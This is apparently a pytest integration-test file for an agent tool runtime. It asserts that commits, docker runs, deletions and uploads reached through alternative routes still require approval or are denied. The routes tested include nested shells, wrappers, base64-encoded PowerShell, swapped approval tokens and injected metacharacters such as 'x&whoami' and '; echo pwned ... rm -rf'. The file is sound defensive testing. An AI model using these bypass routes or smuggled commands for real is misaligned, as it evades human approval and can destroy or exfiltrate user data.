"""M2 exit criterion: forbidden and approval-required actions cannot bypass policy.

Each case requests a consequential action through an *alternative* route (a shell, a
nested interpreter, a wrapper, an encoded command) and asserts the runtime still demands
approval or denies — and that no process is started.
"""

import base64
import shutil
import sys
from unittest.mock import AsyncMock

import pytest

from panos_core.tools import ToolStatus
from tests.integration.tools.conftest import Stack

pytestmark = [pytest.mark.req("NFR-SEC-002", "FR-011", "BR-017", "BR-018")]

needs_powershell = pytest.mark.skipif(
    not (shutil.which("pwsh") or shutil.which("powershell")), reason="PowerShell not available"
)


@pytest.fixture
def no_spawn(monkeypatch: pytest.MonkeyPatch) -> AsyncMock:
    spawn = AsyncMock(side_effect=AssertionError("a process was started"))
    monkeypatch.setattr("panos_core.tools.builtin.shell.run_process", spawn)
    return spawn


@pytest.fixture
def fake_bins(stack: Stack, monkeypatch: pytest.MonkeyPatch) -> None:
    """Fake executables on PATH so resolution succeeds without the real tools."""
    bindir = stack.root.parent / "bin"
    bindir.mkdir(exist_ok=True)
    suffix = ".exe" if sys.platform == "win32" else ""
    for name in (
        "git",
        "docker",
        "kubectl",
        "bash",
        "sh",
        "cmd",
        "wsl",
        "env",
        "pwsh",
        "powershell",
        "python",
        "npx",
        "curl",
        "find",
    ):
        path = bindir / f"{name}{suffix}"
        path.write_text("", encoding="utf-8")
        path.chmod(0o755)
    monkeypatch.setenv("PATH", str(bindir))


BYPASS_ATTEMPTS = [
    (["git", "commit", "-m", "x"], "git.commit"),
    (["git", "push", "--force"], "git.mutate.shared"),
    (["git", "-c", "alias.ci=commit", "ci", "-m", "x"], "shell.unknown"),
    (["git", "--git-dir=../other/.git", "log"], "shell.unknown"),
    (["bash", "-c", "git add . && git commit -m x"], "git.commit"),
    (["sh", "-c", "docker run --rm alpine"], "docker.exec"),
    (["bash", "-c", "$(echo git) commit"], "shell.unknown"),
    (["cmd", "/c", "git commit -m x"], "git.commit"),
    (["cmd", "/c", "set X=commit& git %X%"], "shell.unknown"),
    (["wsl", "--", "docker", "compose", "up"], "docker.exec"),
    (["env", "GIT_DIR=x", "git", "commit"], "git.commit"),
    (["docker", "run", "alpine"], "docker.exec"),
    (["kubectl", "apply", "-f", "deploy.yml"], "k8s.mutate"),
    (["python", "-c", "print(1)"], "shell.unknown"),
    (["npx", "anything"], "shell.unknown"),
    (["find", ".", "-name", "*.tmp", "-delete"], "shell.unknown"),
    (["curl", "-F", "file=@notes.txt", "https://example.invalid"], "net.upload"),
]


@pytest.mark.req("AC-US040-02", "AC-US041-02", "AC-US041-03")
@pytest.mark.parametrize(("argv", "action"), BYPASS_ATTEMPTS)
async def test_shell_routes_cannot_bypass_approval(
    stack: Stack, fake_bins: None, no_spawn: AsyncMock, argv: list[str], action: str
) -> None:
    result = await stack.runtime.invoke("shell.run", {"argv": argv}, stack.ctx())
    assert result.action == action
    assert result.status in (ToolStatus.APPROVAL_REQUIRED, ToolStatus.DENIED)
    no_spawn.assert_not_called()


@needs_powershell
@pytest.mark.req("AC-US040-02")
@pytest.mark.parametrize(
    "script",
    ["git status; git commit -m x", "Get-ChildItem *.log | Remove-Item", "& $command"],
)
async def test_powershell_profile_cannot_bypass_approval(
    stack: Stack, no_spawn: AsyncMock, script: str
) -> None:
    result = await stack.runtime.invoke(
        "shell.run", {"profile": "powershell", "script": script}, stack.ctx()
    )
    assert result.status in (ToolStatus.APPROVAL_REQUIRED, ToolStatus.DENIED)
    no_spawn.assert_not_called()


@needs_powershell
async def test_encoded_command_cannot_hide_a_commit(
    stack: Stack, fake_bins: None, no_spawn: AsyncMock
) -> None:
    encoded = base64.b64encode("git commit -m x".encode("utf-16-le")).decode()
    result = await stack.runtime.invoke(
        "shell.run", {"argv": ["powershell", "-NoProfile", "-EncodedCommand", encoded]}, stack.ctx()
    )
    assert result.action == "git.commit"
    assert result.status == ToolStatus.APPROVAL_REQUIRED


async def test_approval_for_one_command_cannot_run_another(
    stack: Stack, fake_bins: None, no_spawn: AsyncMock
) -> None:
    first = await stack.runtime.invoke(
        "shell.run", {"argv": ["docker", "run", "alpine"]}, stack.ctx()
    )
    assert first.approval_id is not None
    token = (await stack.approvals.decide(first.approval_id, approve=True, decided_by="user")).token
    swapped = await stack.runtime.invoke(
        "shell.run",
        {"argv": ["docker", "run", "--privileged", "alpine"]},
        stack.ctx(),
        approval_token=token,
    )
    assert swapped.status == ToolStatus.DENIED
    assert "action_changed" in (swapped.error or "")
    no_spawn.assert_not_called()


async def test_approval_cannot_cross_tools(stack: Stack, fake_bins: None) -> None:
    deletion = await stack.runtime.invoke("fs.delete", {"path": "README.md"}, stack.ctx())
    assert deletion.approval_id is not None
    token = (
        await stack.approvals.decide(deletion.approval_id, approve=True, decided_by="user")
    ).token
    other = await stack.runtime.invoke(
        "fs.delete", {"path": "src/app.py"}, stack.ctx(), approval_token=token
    )
    assert other.status == ToolStatus.DENIED
    assert (stack.root / "src" / "app.py").exists()


async def test_batch_file_metacharacters_are_refused(stack: Stack) -> None:
    script = stack.root / "build.bat"
    script.write_text("@echo off\n", encoding="utf-8")
    result = await stack.runtime.invoke(
        "shell.run",
        {"argv": ["./build.bat", "x&whoami"]},
        stack.ctx(allowed_commands=(("build",),)),
    )
    if sys.platform == "win32":
        assert result.status == ToolStatus.DENIED
        assert "batch" in (result.error or "")
    else:
        assert result.status in (ToolStatus.DENIED, ToolStatus.APPROVAL_REQUIRED)


async def test_arguments_are_never_shell_interpreted(stack: Stack) -> None:
    """In direct mode `;` and `&&` are literal arguments, not command separators."""
    marker = stack.root / "pwned.txt"
    code = "import sys; print(sys.argv[1:])"
    result = await stack.runtime.invoke(
        "shell.run",
        {"argv": [sys.executable, "-c", code, "; echo pwned > pwned.txt", "&&", "rm", "-rf"]},
        stack.ctx(allowed_commands=((sys.executable, "-c"),)),
    )
    assert result.status == ToolStatus.SUCCEEDED
    assert result.output is not None
    assert "; echo pwned > pwned.txt" in result.output["stdout"]
    assert not marker.exists()
